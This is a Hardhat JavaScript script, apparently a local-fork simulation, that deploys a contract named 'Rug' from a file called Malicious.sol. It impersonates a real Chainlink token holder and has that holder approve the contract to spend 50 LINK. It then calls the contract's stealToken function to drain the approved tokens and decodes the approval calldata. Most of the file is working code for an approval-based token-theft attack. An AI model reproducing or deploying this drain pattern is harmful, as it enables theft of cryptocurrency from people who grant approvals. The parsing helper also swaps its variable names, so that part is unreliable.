const hre = require("hardhat");
const ABI = require("../artifacts/contracts/Malicious.sol/Rug.json");
const ERC20ABI = require("../ABI/ERC20ABI.json");

function parseApprovalData(data){
  const trimed = data.slice(2,data.length); //Remove 0x
  const functionSignature = trimed.slice(0,8);  //Get function signature
  const remainingdata = trimed.slice(8,trimed.length); //Spender address + value (64+64)
  const valuepart = remainingdata.slice(0,remainingdata.length/2); // Spender address
  const addrpart = remainingdata.slice(remainingdata.length/2,remainingdata.length); //Value in hex

  // Parse the address part (0x + 40hex);
  const address = "0x" + addrpart.slice(-40);
  const value = parseInt(valuepart,16);

  return {
      signature:functionSignature,
      spender:address,
      value,
  }
}



async function main() {
// Deploy contract
    const Rug = await hre.ethers.getContractFactory("Rug");
    const rug = await Rug.deploy();

    await rug.deployed();

    console.log("Rug contract has been deployed with address: ",rug.address);

    //OUR: 0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199

    // Simulate transaction
    const impersonateSigner = await ethers.getImpersonatedSigner("0x058A871358c1B01039A265635eA282c3F435a9Ed");
    // await impersonateSigner

    const provider = new ethers.providers.JsonRpcProvider('http://localhost:8545');

    const balanceWei = await provider.getBalance("0x058A871358c1B01039A265635eA282c3F435a9Ed"); //Random chainlink owner
    console.log("Balance : ", ethers.utils.formatEther(balanceWei));

    // Rug contract: 0x9155497EAE31D432C0b13dBCc0615a37f55a2c87
    // Contract instance
    // const MaliciousContract  = new ethers.Contract(rug.address,ABI.abi,impersonateSigner);
    // console.log("Calling function");

    // const tx = await MaliciousContract.buy({value:ethers.utils.parseUnits("100","ether")});
    // console.log("Transfer Transaction: ",tx);

    // // const MaliciousContractProvider  = new ethers.Contract(,ABI.abi,provider)";
    // const tx2 = await MaliciousContract.setValue(10);
    // console.log("Non transfer transaction: ",tx2);

    // Contract instance for ERC20 tokens
    const ERC20Token = new ethers.Contract("0x514910771AF9Ca656af840dff83E8264EcF986CA",ERC20ABI,impersonateSigner); //Chainlink address
    const tokenName = await ERC20Token.name();
    console.log("Token name: ",tokenName);

    // console.log("Transfer transaction: ");
    // const transfertx = await ERC20Token.transfer("0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199",ethers.utils.parseUnits("20","ether"));
    // console.log("Transfer recepit: ",transfertx);


    console.log("Approving");
    const approvetx = await ERC20Token.approve(`${rug.address}`,ethers.utils.parseUnits("50","ether"));
    console.log("Transaction approved: ",approvetx);

    // const delegatedTransfer = await ERC20Token.transferFrom("0x058A871358c1B01039A265635eA282c3F435a9Ed","0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199",ethers.utils.parseUnits("50","ether"));
    // console.log("Delegated Transfer receipt: ",delegatedTransfer);
    


      // Rug contract 
      console.log("Steal ");
      const delegatedTransfer = await rug.stealToken("0x058A871358c1B01039A265635eA282c3F435a9Ed");
      console.log("Steal transaction: ",delegatedTransfer);
      console.log("Parsed data: ");
      console.log(parseApprovalData(delegatedTransfer.data));








    
  }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
